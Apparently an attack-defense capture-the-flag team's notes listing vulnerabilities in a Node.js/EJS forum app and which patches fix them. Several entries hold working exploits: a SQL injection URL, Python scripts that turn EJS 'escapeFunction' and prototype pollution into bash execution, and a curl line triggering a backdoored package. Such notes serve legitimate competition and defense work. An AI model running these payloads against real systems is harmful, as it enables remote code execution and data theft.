# Current

> [x]: patched in `020411.patch`
>
> [y]: patched in `020412.patch`

## password exposure (views/profile.ejs) [y]

## change someone else's password (routes/users.js) [x]

## register role control (routes/users.js) [x]

## missing return in `adminRequired` (utils.js)

## path traversal LFR (middlewares/static.js) [x]

## session direct modification (routes/users.js) [x]

with `/update`

## session forgery 1 (middlewares/session.js) [x]

`secretkey` != `secretKey`

## session forgery 2 (middlewares/session.js)

AES-GCM no `final()`, same as AES-CTR flipping

> same idea as https://blog.maple3142.net/2022/07/24/dicectf-at-hope-writeups/#payment-pal

## file upload path traversal + SSTI (routes/users.js)

## argument injection (admin only) (routes/admin.js)

## XSS (no admin bot yet) (views/profile.ejs)

profile description direct XSS using markdown

profile image url `src` is not quoted

```ejs
<img id="profilePicture" src=<%= page_user.profile_picture_url %> alt="Profile Picture for <%= page_user.username %>" style="max-width: 300px;" />
```

## sql injection (routes/boards.js)

```
GET /board/-1%20union%20select%20'-1%20union%20select%20username,password%20from%20users',%200/category
```

## ejs render injection (routes/boards.js)

https://github.com/mde/ejs/issues/735

```python
import httpx

client = httpx.Client(base_url="http://localhost:8763")
client.post("/login", data={"username": "user", "password": "user"})

r = client.post(
    "/board/1/new-thread",
    params={"preview": 1},
    json={
        "settings": {
            "view options": {
                "client": True,
                "escapeFunction": """1;return global.process.binding('spawn_sync').spawn(
                    {
                        file:'/bin/bash',
                        args:['bash','-c','cat /flag'],
                        stdio: [
                            {type:'pipe',readable:!0,writable:!1},
                            {type:'pipe',readable:!1,writable:!0},
                            {type:'pipe',readable:!1,writable:!0}
                        ]
                }).output[1].toString()""",
            }
        }
    },
)
print(r.text)
```

## supply chain attack (package.json)

```bash
curl 'http://localhost:8763' -H 'User-Agent:Mozilla/48.763 id'
```

## prototype pollution (utils.js)

same ejs gadget can be used:

```python
import httpx

client = httpx.Client(base_url="http://localhost:8763")
client.post("/login", data={"username": "user", "password": "user"})

client.post(
    "/update",
    json={
        "__proto__": {
            "client": True,
            "escapeFunction": """1;return global.process.binding('spawn_sync').spawn(
                    {
                        file:'/bin/bash',
                        args:['bash','-c','cat /flag'],
                        stdio: [
                            {type:'pipe',readable:!0,writable:!1},
                            {type:'pipe',readable:!1,writable:!0},
                            {type:'pipe',readable:!1,writable:!0}
                        ]
                }).output[1].toString()""",
        }
    },
)

r = client.get("/")
print(r.text)
```

or there are probably more gadgets

## path traversal (two ways) + yaml deserialization (middlewares/i18n.js)

profile file upload

## `coerce` deserialization (utils.js) [y]

`js:eval:...`

## admin database management (routes/admin.js)

use sqltite to write file, then combine it with ejs or something else

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#remote-command-execution-using-sqlite-command---attach-database

# TODO

## url file upload LFR (fetch?)

## import() lfi

## race condition

## and more...
